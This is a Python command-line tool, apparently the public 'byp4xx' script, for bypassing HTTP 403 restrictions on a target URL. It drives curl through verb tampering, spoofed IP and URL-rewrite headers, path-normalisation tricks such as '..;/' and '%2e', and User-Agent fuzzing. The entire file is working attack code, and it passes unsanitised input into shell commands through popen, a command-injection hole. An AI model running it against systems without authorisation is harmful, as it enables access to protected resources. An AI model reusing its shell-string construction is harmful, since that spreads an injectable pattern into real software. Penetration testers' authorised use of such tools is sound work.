#!/usr/bin/python3
import sys
from os import popen


def banner():
	print('\033[92m    __                 \033[91m__ __           ')
	print('\033[92m   / /_  __  ______   \033[91m/ // / _  ___  __')
	print('\033[92m  / __ \/ / / / __ \ \033[91m/ // /_| |/_/ |/_/')
	print('\033[92m / /_/ / /_/ / /_/ /\033[91m/__  __/>  <_>  <  ')
	print('\033[92m/_.___/\__, / .___/   \033[91m/_/ /_/|_/_/|_|  ')
	print('\033[92m      /____/_/                        ')
	print('by: @lobuhisec \033[0m')
	print('')

#Defining the standard curl calling. Default options used: -k -s -I (HEAD method) 
#Code is returned already colored
def curl_code_response(options_var, payload_var):
	code = popen("curl -k -s -I %s %s | grep HTTP | tail -1" % (options_var, payload_var)).read()

	#If we use -x proxy curl option then we must take the third line of the response
	if "-x" in options_var:
		code = code.split('\n',3)[2]
	else:
		code = code.split('\n',1)[0]

	try:
		status = code.split(" ")[1] # Status code is in second position
	except:
		print("\033[91m Status not found \033[0m")
		return # consider using sys.exit(1)

	#200=GREEN
	if status == "200":
		code = "\033[92m"+code+"\033[0m"
	#30X=ORANGE
	elif status.startswith("30"):
		code = "\033[93m"+code+" TIP: Consider to use -L option to follow redirections\033[0m"
	#40X or 50X=RED
	elif  status.startswith("40") or  status.startswith("50"):
		code = "\033[91m"+code+"\033[0m"
	return code

def main():
	import argparse
	parser = argparse.ArgumentParser()
	# Mandatory arguments as suggested here: https://stackoverflow.com/a/24181138
	requiredNamed = parser.add_argument_group('required named arguments')
	requiredNamed.add_argument('--target', help="The url target of the tests", required=True)
	parser.add_argument("--curl-options", help="Any additional options to pass to curl")
	parser.add_argument('--bypass-ip',
		help='Try bypass tests with a specific IP address (or hostname). i.e.: "X-Forwarded-For: 192.168.0.1" instead of "X-Forwarded-For: 127.0.0.1"')
	# Another "pythonic" way of parsing args for enabling/disabling: https://stackoverflow.com/a/30500877
	user_agents_parser = parser.add_mutually_exclusive_group(required=False)
	user_agents_parser.add_argument('--fuzz-user-agents', dest='fuzz_user_agents', action='store_true',
		help='Skip question and fuzz user agents with UserAgents.fuzz.txt from SecList or not.')
	user_agents_parser.add_argument('--skip-fuzz-user-agents', dest='fuzz_user_agents', action='store_false',
		help='Skip question and not fuzz User-Agent header.')
	user_agents_parser.set_defaults(fuzz_user_agents=None)
	args = parser.parse_args()

	#Parse curl options and target from args
	options = ''
	if args.curl_options != None:
		options = args.curl_options
	target = args.target

	#Check if URL starts with http/https
	if not target.startswith("http"):
		print("URL parameter does not start with http:// or https://")
		sys.exit(1)

	#Count "/" on target param just to parse the last part of URI path
	bar_count = target.count("/")
	if target.endswith("/"):
		bar_count = bar_count -1

	if bar_count == 2:
		url = target
		uri = ""
	else:
		aux =  target.split("/")
		url = "/".join(aux[:bar_count])
		uri = aux[bar_count]

	###########TESTS start here!!!!
	print('\033[92m\033[1m[+]VERB TAMPERING\033[0m')
	payload = url + "/" + uri
	print("ACL: ",curl_code_response(options+" -X ACL",payload))
	print("ARBITRARY: ",curl_code_response(options+" -X ARBITRARY",payload))
	print("BASELINE-CONTROL: ",curl_code_response(options+" -X BASELINE-CONTROL",payload))
	print("CHECKIN: ",curl_code_response(options+" -X CHECKIN",payload))
	print("CHECKOUT: ",curl_code_response(options+" -X CHECKOUT",payload))
	print("CONNECT: ",curl_code_response(options+" -X CONNECT",payload))
	print("COPY: ",curl_code_response(options+" -X COPY",payload))
	#print("GET: ",curl_code_response(options+" -X DELETE",payload)) #too dangerous!
	print("GET: ",curl_code_response(options+" -X GET",payload))
	print("HEAD: ",curl_code_response(options+" -X HEAD -m 1",payload))
	print("LABEL: ",curl_code_response(options+" -X LABEL",payload))
	print("LOCK: ",curl_code_response(options+" -X LOCK",payload))
	print("MERGE: ",curl_code_response(options+" -X MERGE",payload))
	print("MKACTIVITY: ",curl_code_response(options+" -X MKACTIVITY",payload))
	print("MKCOL: ",curl_code_response(options+" -X MKCOL",payload))
	print("MKWORKSPACE: ",curl_code_response(options+" -X MKWORKSPACE",payload))
	print("MOVE: ",curl_code_response(options+" -X MOVE",payload))
	print("OPTIONS: ",curl_code_response(options+" -X OPTIONS",payload))
	print("ORDERPATCH: ",curl_code_response(options+" -X ORDERPATCH",payload))
	print("PATCH: ",curl_code_response(options+" -X PATCH",payload))
	print("POST: ",curl_code_response(options+" -X POST",payload))
	print("PROPFIND: ",curl_code_response(options+" -X PROPFIND",payload))
	print("PROPPATCH: ",curl_code_response(options+" -X PROPPATCH",payload))
	print("PUT: ",curl_code_response(options+" -X PUT",payload))
	print("REPORT: ",curl_code_response(options+" -X REPORT",payload))
	print("SEARCH: ",curl_code_response(options+" -X SEARCH",payload))
	print("TRACE: ",curl_code_response(options+" -X TRACE",payload))
	print("UNCHECKOUT: ",curl_code_response(options+" -X UNCHECKOUT",payload))
	print("UNLOCK: ",curl_code_response(options+" -X UNLOCK",payload))
	print("UPDATE: ",curl_code_response(options+" -X UPDATE",payload))
	print("VERSION-CONTROL: ",curl_code_response(options+" -X VERSION-CONTROL",payload))
	print("")
	###########HEADERS
	print('\033[92m\033[1m[+]HEADERS\033[0m')
	print("Referer: ",curl_code_response(options+" -X GET -H \"Referer: "+payload+"\"",payload))
	payload=url+"/"
	print("X-Original-URL: ",curl_code_response(options+" -X GET -H \"X-Original-URL: /"+uri+"\"",payload))
	print("X-Rewrite-URL: ",curl_code_response(options+" -X GET -H \"X-Rewrite-URL: /"+uri+"\"",payload))
	# Now iterate over all the tests that use a specific IP to bypass
	bypass_ips = ['127.0.0.1']
	if args.bypass_ip:
		bypass_ips.append(args.bypass_ip)
	for bypass_ip in bypass_ips:
		print('\033[92m\033[1m[.]Headers checks with IP {}\033[0m'.format(bypass_ip))
		print("X-Custom-IP-Authorization: ",curl_code_response(options+" -X GET -H \"X-Custom-IP-Authorization: {}\"".format(bypass_ip),payload))
		payload=url+"/"+uri+"..\;"
		print("X-Custom-IP-Authorization + ..;: ",curl_code_response(options+" -X GET -H \"X-Custom-IP-Authorization: {}\"".format(bypass_ip),payload))
		payload=url+"/"+uri
		print("X-Originating-IP: ",curl_code_response(options+" -X GET -H \"X-Originating-IP: {}\"".format(bypass_ip),payload))
		print("X-Forwarded-For: ",curl_code_response(options+" -X GET -H \"X-Forwarded-For: {}\"".format(bypass_ip),payload))
		print("X-Remote-IP: ",curl_code_response(options+" -X GET -H \"X-Remote-IP: {}\"".format(bypass_ip),payload))
		print("X-Client-IP: ",curl_code_response(options+" -X GET -H \"X-Client-IP: {}\"".format(bypass_ip),payload))
		print("X-Host: ",curl_code_response(options+" -X GET -H \"X-Host: {}\"".format(bypass_ip),payload))
		print("X-Forwarded-Host: ",curl_code_response(options+" -X GET -H \"X-Forwarded-Host: {}\"".format(bypass_ip),payload))
		print("")
	###########BUGBOUNTY
	print('\033[92m\033[1m[+]#BUGBOUNTYTIPS\033[0m')
	payload=url+"/%2e/"+uri
	print("%2e: ",curl_code_response(options+" -X GET",payload))
	payload=url+"/"+uri+"/."
	print("Ends with /.: ",curl_code_response(options+" -X GET --path-as-is",payload))
	payload=url+"/"+uri+"?"
	print("Ends with ?: ",curl_code_response(options+" -X GET",payload))
	payload=url+"/"+uri+"??"
	print("Ends with ??: ",curl_code_response(options+" -X GET",payload))
	payload=url+"/"+uri+"//"
	print("Ends with //: ",curl_code_response(options+" -X GET",payload))
	payload=url+"/./"+uri+"/./"
	print("Between /./: ",curl_code_response(options+" -X GET --path-as-is",payload))
	payload=url+"/"+uri+"/"
	print("Ends with /: ",curl_code_response(options+" -X GET",payload))
	payload=url+"/"+uri+"/.randomstring"
	print("Ends with .randomstring: ",curl_code_response(options+" -X GET",payload))
	payload=url+"/"+uri+"..\;/"
	print("Ends with ..;: ",curl_code_response(options+" -X GET --path-as-is",payload))
	payload=url+"/.\;/"+uri
	print("Between /.;/: ",curl_code_response(options+" -X GET --path-as-is",payload))
	payload=url+"\;foo=bar/"+uri
	print("Between ;foo=bar;/: ",curl_code_response(options+" -X GET --path-as-is",payload))
	print("")
	###########UserAgents
	payload=url+"/"+uri
	if args.fuzz_user_agents == None:
		# Ask user
		response=input("Do you want to try with UserAgents.fuzz.txt from SecList? (2454 requests) [y/N]: ")
		if response.lower() == 'n' or response == "":
			sys.exit(1)
		else:
			fuzz_user_agents(payload, options)
	elif args.fuzz_user_agents == True:
		# Run user-agents fuzzing without asking
		fuzz_user_agents(payload, options)
		pass
	elif args.fuzz_user_agents == True:
		# Skip it
		pass

def fuzz_user_agents(payload, options):
	print('\033[92m\033[1m[+]UserAgents\033[0m')
	with open("UserAgents.fuzz.txt") as file:  
		for line in file:
			print(line.strip()+":"+curl_code_response(options+" -X GET -H \"User-Agent: "+line.strip()+"\"",payload))


if __name__ == "__main__":
	try:
		banner()
		main()
	except KeyboardInterrupt:
		print("Aborting...")
	except Exception as e:
		print(e)
